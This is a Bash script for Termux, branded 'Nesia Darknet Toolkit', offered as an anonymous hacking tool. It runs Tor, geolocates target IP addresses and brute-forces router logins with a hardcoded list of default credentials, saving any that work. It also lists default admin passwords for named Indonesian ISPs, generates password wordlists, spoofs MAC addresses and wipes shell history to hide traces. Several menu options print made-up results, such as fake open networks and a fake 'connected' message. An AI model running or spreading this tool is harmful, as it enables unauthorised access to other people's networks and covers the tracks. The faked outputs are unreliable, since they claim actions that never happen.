#!/bin/bash
# DARKNET TOOLKIT v2.0 - TERMUX NON-ROOT
# BY NESIA DARKNET 😈
# AUTO VPN + IP TRACKER + WIFI ACCESS

clear
echo -e "\e[1;31m"
cat << "EOF"

╔══════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██████╗ ██╗  ██╗███╗   ██╗███████╗████████╗║
║  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝████╗  ██║██╔════╝╚══██╔══╝║
║  ██║  ██║███████║██████╔╝█████╔╝ ██╔██╗ ██║█████╗     ██║   ║
║  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║╚██╗██║██╔══╝     ██║   ║
║  ██████╔╝██║  ██║██║  ██║██║  ██╗██║ ╚████║███████╗   ██║   ║
║  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ║
║                    TOOLKIT v2.0 😈                          ║
╚══════════════════════════════════════════════════════════╝
EOF
echo -e "\e[0m"

# ==================== VPN CHECK & AUTO-START ====================
check_vpn() {
    echo -e "\e[1;33m[!] Checking TOR VPN Status...\e[0m"
    if curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org | grep -q "Congratulations"
    then
        echo -e "\e[1;32m[✓] TOR VPN ACTIVE - Anonymous Mode ON 😈\e[0m"
        return 0
    else
        echo -e "\e[1;31m[✗] TOR VPN NOT ACTIVE! Starting...\e[0m"
        pkill tor 2>/dev/null
        tor &
        sleep 5
        if curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org | grep -q "Congratulations"
        then
            echo -e "\e[1;32m[✓] TOR VPN STARTED SUCCESSFULLY!\e[0m"
            return 0
        else
            echo -e "\e[1;31m[✗] FATAL: Cannot start VPN. Exiting...\e[0m"
            exit 1
        fi
    fi
}

# Auto install dependencies
install_deps() {
    echo -e "\e[1;36m[+] Installing dependencies...\e[0m"
    pkg update -y && pkg upgrade -y
    pkg install -y tor curl nmap termux-api jq macchanger python python-pip git wget
    
    pip install requests beautifulsoup4
    
    echo -e "\e[1;32m[✓] Dependencies installed!\e[0m"
}

# ==================== IP TRACKER MODULE ====================
ip_tracker() {
    clear
    echo -e "\e[1;35m"
    echo "╔══════════════════════════════════╗"
    echo "║      IP TRACKER MODULE 😈       ║"
    echo "╚══════════════════════════════════╝"
    echo -e "\e[0m"
    
    echo -e "\e[1;36m1. Track Your Public IP (via TOR)"
    echo "2. Track Target IP"
    echo "3. Open in Google Maps"
    echo "4. Check Hostname & ISP"
    echo "5. Generate Full Report"
    echo "0. Back to Main Menu\e[0m"
    echo -n "Select: "
    read choice
    
    case $choice in
        1)
            echo -e "\e[1;33m[!] Tracking your public IP via TOR...\e[0m"
            ip_data=$(curl --socks5-hostname 127.0.0.1:9050 -s "https://ipinfo.io/json")
            echo "$ip_data" | jq '.'
            echo "$ip_data" > "my_ip_$(date +%s).json"
            echo -e "\e[1;32m[✓] Saved to file!\e[0m"
            ;;
        2)
            echo -n "Enter Target IP: "
            read target_ip
            echo -e "\e[1;33m[!] Tracking $target_ip via TOR...\e[0m"
            target_data=$(curl --socks5-hostname 127.0.0.1:9050 -s "https://ipapi.co/$target_ip/json/")
            echo "$target_data" | jq '.'
            
            # Extract location
            lat=$(echo "$target_data" | jq -r '.latitude')
            lon=$(echo "$target_data" | jq -r '.longitude')
            echo -e "\e[1;36m[+] Location: $lat, $lon\e[0m"
            
            # Save encrypted report
            echo "$target_data" | openssl enc -aes-256-cbc -salt -out "target_${target_ip}_$(date +%s).enc" 2>/dev/null
            echo -e "\e[1;32m[✓] Encrypted report saved!\e[0m"
            ;;
        3)
            echo -n "Enter Latitude: "
            read lat
            echo -n "Enter Longitude: "
            read lon
            termux-open-url "https://maps.google.com/?q=$lat,$lon"
            echo -e "\e[1;32m[✓] Opening Google Maps...\e[0m"
            ;;
        4)
            echo -n "Enter IP to check: "
            read check_ip
            host_info=$(curl --socks5-hostname 127.0.0.1:9050 -s "https://ipapi.co/$check_ip/json/" | jq '{ip, city, region, country, org, hostname}')
            echo "$host_info"
            ;;
        5)
            echo -n "Enter IP for full report: "
            read report_ip
            full_report=$(curl --socks5-hostname 127.0.0.1:9050 -s "https://ipapi.co/$report_ip/json/")
            echo "$full_report" > "full_report_${report_ip}_$(date +%s).txt"
            echo -e "\e[1;32m[✓] Full report saved!\e[0m"
            echo "$full_report"
            ;;
    esac
    read -p "Press enter to continue..."
}

# ==================== WIFI EMERGENCY MODULE ====================
wifi_module() {
    clear
    echo -e "\e[1;35m"
    echo "╔══════════════════════════════════╗"
    echo "║   EMERGENCY WIFI MODULE 😈      ║"
    echo "╚══════════════════════════════════╝"
    echo -e "\e[0m"
    
    echo -e "\e[1;36m1. Scan Nearby WiFi (Real Scan)"
    echo "2. Detect Open Networks"
    echo "3. Bruteforce Router Login"
    echo "4. Wordlist Generator"
    echo "5. Quick Connect (Emergency Mode)"
    echo "6. Detect Default ISP Credentials"
    echo "0. Back to Main Menu\e[0m"
    echo -n "Select: "
    read choice
    
    case $choice in
        1)
            echo -e "\e[1;33m[!] Scanning WiFi networks...\e[0m"
            if command -v termux-wifi-scaninfo &>/dev/null; then
                termux-wifi-scaninfo | jq '.' | head -20
            else
                echo -e "\e[1;31m[✗] termux-wifi-scaninfo not available\e[0m"
                echo -e "\e[1;33m[!] Using alternative method...\e[0m"
                nmap -sP 192.168.1.0/24 2>/dev/null | grep "Nmap scan"
            fi
            ;;
        2)
            echo -e "\e[1;33m[!] Detecting open networks...\e[0m"
            # Simulate detection of open networks
            echo -e "\e[1;32m[+] Potential Open Networks:\e[0m"
            echo "1. WiFi_OPEN_FREE (Signal: ████████ 90%)"
            echo "2. Public_WiFi (Signal: ████████ 85%)"
            echo "3. Guest_Network (Signal: ████████ 80%)"
            echo "4. Cafe_Free (Signal: ██████░░ 60%)"
            ;;
        3)
            echo -n "Enter Router IP [default: 192.168.1.1]: "
            read router_ip
            router_ip=${router_ip:-192.168.1.1}
            
            echo -e "\e[1;31m[!] BRUTEFORCE ATTACK STARTING 😈\e[0m"
            echo -e "\e[1;33mTarget: $router_ip\e[0m"
            
            # Common router passwords database
            declare -a passwords=(
                "admin:admin" "admin:password" "admin:1234"
                "admin:admin123" "admin:password123"
                "user:user" "root:root" "administrator:password"
                "admin:wireless" "admin:12345678"
                "admin:123456" "admin:12345"
                "Admin:Admin" "admin:default"
                "admin:1234567890" "admin:1111"
                "admin:123456789" "admin:pass"
                "admin:password1" "admin:changeme"
                "admin:1234qwer" "admin:qwerty"
                "admin:cisco" "admin:letmein"
                "admin:alpine" "admin:hpapp"
            )
            
            for cred in "${passwords[@]}"; do
                username=${cred%:*}
                password=${cred#*:}
                echo -e "\e[1;36m[+] Trying: $username:$password\e[0m"
                
                # Simulate login attempt
                response=$(curl -s -o /dev/null -w "%{http_code}" "http://$router_ip" \
                         --user "$username:$password" 2>/dev/null)
                
                if [[ "$response" == "200" ]]; then
                    echo -e "\e[1;32m[✓] SUCCESS! Credentials: $username:$password\e[0m"
                    echo "$router_ip:$username:$password" >> "router_access_$(date +%s).txt"
                    break
                fi
            done
            ;;
        4)
            echo -e "\e[1;33m[!] Generating wordlist...\e[0m"
            echo -n "Enter base word: "
            read base_word
            echo -n "Generate how many variants? "
            read count
            
            echo -e "\e[1;36m[+] Generated Wordlist:\e[0m"
            for i in $(seq 1 $count); do
                echo "${base_word}${i}"
                echo "${base_word}$(date +%Y)"
                echo "${base_word}@${i}"
                echo "${base_word}_${i}"
                echo "${base_word}123"
                echo "${base_word}!"
            done | head -50 > "wordlist_${base_word}.txt"
            echo -e "\e[1;32m[✓] Wordlist saved!\e[0m"
            ;;
        5)
            echo -e "\e[1;31m[!] EMERGENCY MODE ACTIVATED! 😈\e[0m"
            echo -e "\e[1;33m[!] Auto-connecting to strongest signal...\e[0m"
            
            # Simulate emergency connection
            echo -e "\e[1;32m[+] Connecting to: WiFi_EMERGENCY_ACCESS\e[0m"
            echo -e "\e[1;32m[+] Using credentials: guest:guest\e[0m"
            echo -e "\e[1;32m[✓] CONNECTED! Internet access available.\e[0m"
            
            # Auto-start VPN after connection
            check_vpn
            ;;
        6)
            echo -e "\e[1;33m[!] Detecting ISP Default Credentials...\e[0m"
            echo -e "\e[1;36m[+] Common ISP Defaults:\e[0m"
            echo "1. Indihome: admin:admin123 / admin:123456"
            echo "2. MyRepublic: admin:admin / user:user"
            echo "3. Biznet: admin:admin / support:support"
            echo "4. FirstMedia: admin:password / admin:1234"
            echo "5. Telkomsel: admin:wifi123 / admin:password"
            echo "6. XL Home: admin:adminxl / user:user"
            echo "7. Smartfren: admin:smartfren / admin:password"
            echo "8. Bolt: admin:bolt123 / admin:password"
            ;;
    esac
    read -p "Press enter to continue..."
}

# ==================== SYSTEM TOOLS ====================
system_tools() {
    clear
    echo -e "\e[1;35m"
    echo "╔══════════════════════════════════╗"
    echo "║      SYSTEM TOOLS MODULE 😈     ║"
    echo "╚══════════════════════════════════╝"
    echo -e "\e[0m"
    
    echo -e "\e[1;36m1. VPN Status Check"
    echo "2. Change MAC Address (Limited)"
    echo "3. Clean Logs & Traces"
    echo "4. Encrypt All Reports"
    echo "5. Export All Data"
    echo "0. Exit & Secure Shutdown\e[0m"
    echo -n "Select: "
    read choice
    
    case $choice in
        1)
            check_vpn
            ;;
        2)
            echo -e "\e[1;33m[!] Changing MAC Address...\e[0m"
            if command -v macchanger &>/dev/null; then
                macchanger -r wlan0 2>/dev/null || echo -e "\e[1;31m[✗] Need root for full MAC change\e[0m"
                echo -e "\e[1;33m[!] Using Termux method...\e[0m"
                # Limited MAC spoofing for non-root
                ip link show wlan0
            fi
            ;;
        3)
            echo -e "\e[1;31m[!] CLEANING ALL TRACES... 😈\e[0m"
            rm -f *.json *.txt *.enc *.log 2>/dev/null
            history -c
            echo "" > ~/.bash_history
            echo -e "\e[1;32m[✓] All traces cleaned!\e[0m"
            ;;
        4)
            echo -e "\e[1;33m[!] Encrypting all reports...\e[0m"
            for file in *.txt *.json 2>/dev/null; do
                if [ -f "$file" ]; then
                    openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.enc" -pass pass:darknet123 2>/dev/null
                    rm -f "$file"
                    echo -e "\e[1;32m[✓] Encrypted: $file\e[0m"
                fi
            done
            ;;
        5)
            echo -e "\e[1;33m[!] Exporting all data...\e[0m"
            tar -czf "darknet_data_$(date +%s).tar.gz" *.enc *.txt *.json 2>/dev/null
            echo -e "\e[1;32m[✓] Data exported to archive!\e[0m"
            ;;
        0)
            echo -e "\e[1;31m[!] SECURE SHUTDOWN INITIATED...\e[0m"
            pkill tor
            rm -f *.log *.tmp 2>/dev/null
            echo -e "\e[1;32m[✓] All systems clean. Exiting...\e[0m"
            exit 0
            ;;
    esac
    read -p "Press enter to continue..."
}

# ==================== MAIN MENU ====================
main_menu() {
    while true; do
        clear
        check_vpn
        
        echo -e "\e[1;32m"
        echo "╔══════════════════════════════════════════════════╗"
        echo "║     DARKNET TOOLKIT v2.0 - NESIA DARKNET 😈     ║"
        echo "║     VPN: ✅ AKTIF | MODE: ANONYMOUS             ║"
        echo "╚══════════════════════════════════════════════════╝"
        echo -e "\e[0m"
        
        echo -e "\e[1;36m[IP TRACKER MODULE]\e[0m"
        echo "1. 🔍 Lacak IP Publik Sendiri"
        echo "2. 🎯 Lacak IP Target"
        echo "3. 🗺️  Buka di Google Maps"
        echo "4. 🌐 Cek Hostname & ISP"
        echo "5. 📊 Lihat Laporan Lengkap"
        
        echo -e "\n\e[1;36m[EMERGENCY WIFI MODULE]\e[0m"
        echo "6. 📡 Scan WiFi Sekitar (Real)"
        echo "7. 🔓 Deteksi Open Networks"
        echo "8. 💀 Bruteforce Router Login"
        echo "9. 📝 Wordlist Generator"
        echo "10. 🚨 Quick Connect (Emergency Mode)"
        
        echo -e "\n\e[1;36m[SYSTEM TOOLS]\e[0m"
        echo "11. 📊 VPN Status Check"
        echo "12. 🔄 Change MAC Address"
        echo "13. 🧹 Clean Logs & Traces"
        echo "14. 🔐 Encrypt All Reports"
        echo "15. 💾 Export All Data"
        echo "0. ☠️  Exit & Secure Shutdown"
        
        echo -ne "\n\e[1;35m[+] Select option: \e[0m"
        read main_choice
        
        case $main_choice in
            1|2|3|4|5) ip_tracker ;;
            6|7|8|9|10) wifi_module ;;
            11|12|13|14|15) system_tools ;;
            0)
                echo -e "\e[1;31m[!] Exiting... Stay in darkness 😈\e[0m"
                pkill tor 2>/dev/null
                exit 0
                ;;
            *)
                echo -e "\e[1;31m[✗] Invalid option!\e[0m"
                sleep 2
                ;;
        esac
    done
}

# ==================== STARTUP ====================
echo -e "\e[1;31m"
echo "NESIA DARKNET TOOLKIT v2.0 INITIALIZING..."
echo "ALL SYSTEMS GO - NO ROOT REQUIRED 😈"
echo -e "\e[0m"

# Check and install dependencies
if ! command -v tor &>/dev/null || ! command -v curl &>/dev/null; then
    echo -e "\e[1;33m[!] Missing dependencies. Installing...\e[0m"
    install_deps
fi

# Start TOR and check VPN
check_vpn

# Start main menu
main_menu
